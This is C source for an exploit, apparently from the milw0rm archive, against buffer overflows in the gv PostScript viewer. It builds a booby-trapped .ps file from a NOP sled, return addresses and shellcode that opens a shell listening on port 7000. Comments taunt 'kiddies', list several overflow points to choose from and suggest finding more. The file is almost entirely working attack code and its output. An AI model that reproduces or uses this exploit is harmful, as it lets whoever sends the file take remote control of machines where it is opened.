/* there are at least 4 other stack buffer overflows, and 2 heap overflows.
 * the first exploit i wrote exploited the one in the GLSA, and this one exploits 
 * that hole and four other ones as well. all of these are in the psscan() function
 * located in the ps.c file: 'grep -nP 'sscanf\(.*?%%.*?%s' ps.c'
 * 
 * gv postscript viewer exploit part deux, infamous42md AT hotpop DOT com
 *
 * ok kiddies you've got choices here!  we can overflow the text buffer at 5
 * different places, we can also overflow the heap at 2 places, and ooh i
 * bet if you look around there are tons of other places as well!
 *
 */
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define NOP 0x90
#define NNOPS 512
#define die(x) do{perror(x); exit(EXIT_FAILURE);}while(0)
#define BS 0x10000
#define RETADDR_BYTES 400
#define PS_COMMENT "%!PS-Adobe- ASDF"
#define BOUND_BOX "%%BoundingBox:"
#define ORIENTATION "%%Orientation:"
#define PAGE_ORDER "%%PageOrder:"
#define PAGES "%%Pages:"
#define OUTFILE "h4x0ring_sacr3ts_uncuv3red.ps"

/* call them on port 7000, mine */
char remote[] =
"\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x58\xc6\x04\x24\x02\x89\xe6"
"\xb0\x02\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50"
"\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a"
"\x10\x56\x50\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31"
"\xc0\x31\xdb\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0"
"\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89\xeb\x31\xc9\xb0\x3f\xcd\x80"
"\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x3b\x2c\x30\xcd\x80";

    

int main(int argc, char **argv)
{
    int len, x, fd;
    char    buf[BS];
    u_char  methodman = 0x0;
    u_long  retaddr;

    if(argc < 3){
        fprintf(stderr, "Usage: %s < retaddr > < ownage method c b o p r>\n",
argv[0]);        return EXIT_FAILURE;
    }
    sscanf(argv[1], "%lx", &retaddr);
    methodman = argv[2][0];

    /* create 3vil buf */
    memset(buf, NOP, BS);
    if(methodman == 'b')
        len = snprintf(buf, BS-1, "%s\n%s", PS_COMMENT, BOUND_BOX);
    else if(methodman == 'c')
        len = snprintf(buf, BS-1, "%s", PS_COMMENT);
    else if(methodman == 'o')
        len = snprintf(buf, BS-1, "%s\n%s", PS_COMMENT, ORIENTATION);
    else if(methodman == 'p')
        len = snprintf(buf, BS-1, "%s\n%s", PS_COMMENT, PAGES);
    else if(methodman == 'r')
        len = snprintf(buf, BS-1, "%s\n%s", PS_COMMENT, PAGE_ORDER);
    else{
        printf(
        "Cmon man pick a funkin method!!\n"
        "oh i see, 5 is not enough to choose from??\n"
        "don't worry, there are more, just read the source to find them\n"
        "ok fine, you don't want to overflow the stack, understandable.\n"
        "there are also some heap overflows you picky bastard\n"
        "grep -n sscanf\n");
        return EXIT_FAILURE;
    }

    for(x = 0; x < RETADDR_BYTES - 3; x += sizeof(retaddr))
        memcpy(buf+x+len, &retaddr, sizeof(retaddr));
    len += x + NNOPS;
    strcpy(buf+len, remote);
    strcat(buf+len, "\n");
    len += strlen(remote) + 2; 

    /* create the 3vil file */
    if( (fd = open(OUTFILE, O_RDWR|O_CREAT, 0666)) < 0)
        die("open");
    
    if(write(fd, buf, len) < 0)
        die("write");

    close(fd);
    
    return 0;
}

// milw0rm.com [2004-08-18]